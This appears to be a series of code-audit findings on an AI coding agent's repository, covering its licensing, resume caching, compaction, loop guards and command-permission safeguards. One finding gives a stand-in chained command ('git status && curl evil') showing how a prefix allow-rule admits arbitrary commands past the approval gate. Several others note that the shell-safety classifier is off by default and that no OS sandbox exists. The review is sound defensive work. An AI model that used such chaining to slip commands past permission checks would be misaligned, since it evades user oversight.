subject: kolega-code
title: license conflict is a census misread: BUSL-1.1 binds now; AGPL-3.0+ is only the post-2030 Change License
evidence: LICENSE:1 ('Business Source License 1.1'), LICENSE:27-29 (Change License AGPL-3.0-or-later, Change Date 2030-08-12), pyproject.toml:14 (license = "BUSL-1.1")
one_why: File and manifest agree - what binds is BUSL-1.1 per version until its change trigger (Change Date or 4y after that version's first distribution), after which that version converts to AGPL-3.0+; census 'AGPL-3.0 (file)' matched the Change-License line, so pipeline consumers must treat this repo as BUSL: concepts-only, clean-room, and even post-2030 copies inherit AGPL derivative obligations.

subject: kolega-code
title: resume matched by content cache_key, not position: replays survive script edits, pipeline order drift, and resume-of-resume
one_why: Nuance vs existing workflow-resume-journal portables: label/phase excluded from the key, same-key calls replay FIFO in issue order, and replays are re-recorded into the new journal so a resume of a resume is exact - the strongest resume identity semantics seen in the corpus; BUSL means clean-room reimplementation of the keying+drift-tolerance idea only.

subject: kolega-code
title: command allow-rules match whole command strings, so an executable/prefix grant admits everything chained after it
evidence: kolega_code/permissions.py:299-305 (exact / startswith(pattern+' ') / first-token match), agent/tool_backend/terminal_tool.py:497-503 (create_subprocess_shell shell=True), default check-off at terminal_tool.py:66
one_why: A persisted 'allow git' rule also passes 'git status && curl evil' because no shell-metacharacter split or per-sub-command approval exists; fails closed on callback errors (baseagent.py:1491-1510) and ASK is the default, so exposure is bounded to user-created rules - converge with the grammar-parsed-bash-policy cluster: rules must parse to per-atom commands to be a grant with meaning.

subject: kolega-code
title: persistent per-session Python/JS eval kernels with an in-kernel tool bridge back through the agent's permission-gated tool path
evidence: kolega_code/agent/eval/kernel.py:1-11 (NDJSON protocol, thread-keyed kernel registry, 'in-kernel tool.<name>(args) calls route through that agent's standard tool path'), permissions.py:33-38 ('eval' in COMMAND_PERMISSION_TOOLS)
one_why: Unlike codex's v8 code-mode, kernel state survives cells, tool calls, and sub-agent dispatches, and code inside the kernel calls tools through the same approval gate as the loop - the bridge keeps the permission model intact instead of bypassing it; kernel itself runs on host, so it inherits the no-OS-sandbox ceiling.

subject: kolega-code
title: skill catalog metadata budgeted as a percentage of the context window with a truncation report instead of silent overflow
evidence: kolega_code/cli/skills.py:33 (SKILL_METADATA_CONTEXT_WINDOW_PERCENT=2), :48-57 (budget from context window), :125-140 (render with report), :199-203 (normalized budget)
one_why: Fixes the scaling hole in fixed-char skill catalogs: on a 32k-context model the catalog can't eat the same tokens as on a 200k one, and when skills are dropped the model is told, so it can ask for the remainder - clean-room-portable budget formula + honesty report.

subject: kolega-code
title: test fake that enforces the production context-budget check inside stream(), reproducing the compaction-request-rejected failure mode
one_why: The fake plays the provider renderer on both the gauge path and the enforcement path exactly as production routes them, so the regression (an unfittable compaction request reads as llm_error and permanently disables auto-compaction) fails CI - the pattern 'fake must enforce, not just answer' generalizes beyond compaction.

subject: kolega-code
title: the compaction request itself fits a descending budget ladder with tool-pair-safe middle omission and stall detection
evidence: kolega_code/agent/compression.py:196-203 (why ladder exists), :92-106 (_middle_gap half-head/half-tail), :240-280 (widen_gap_until_fits + snap), :284-303 (rungs 100%->...->10%, no identical re-dispatch)
one_why: Nuance on the overflow-ladder cluster: most subjects degrade the main request but send the summarization request unbounded - at the trigger point it is ~parent-context-sized, so its own fit (omitting whole messages from the middle, never splitting a tool exchange, keeping half the budget for the task statement and half for recent continuity) is what makes auto-compaction robust instead of heroic.

subject: kolega-code
title: no repeated-action breaker in the main loop; guards cover model stalling (silent/truncated turns), runaways only bounded in workflows
evidence: kolega_code/agent/baseagent.py:171-177 (silent/truncated nudge caps), :218+:2571 (max_iterations optional, default None), orchestration/runtime.py:31-33 (DEFAULT_AGENT_CAP=1000 workflow-only backstop)
one_why: An unbounded main loop can burn tokens on repeated near-identical tool calls indefinitely - the silent-turn and truncation guards are about degenerate outputs, not repetition, and the 1000-agent cap lives only in gigacode; crush remains the reference for an in-loop breaker (loop_detection.go:11-40).

subject: kolega-code
title: optional LLM pre-exec shell-safety classifier that fails closed - but off by default
evidence: kolega_code/agent/tool_backend/terminal_tool.py:66 (security_check_enabled = False), :96-153 (fast-model classify, 'Command not executed. Could not verify safety' on any error)
one_why: The classifier's fail-closed-on-error posture is the part to note (every failure path returns not-executed), unlike phantom-safety-control subjects where the check vanishes on error; but default-off plus an unenforced rule layer keeps the whole safety stack at the tested-approval rung.
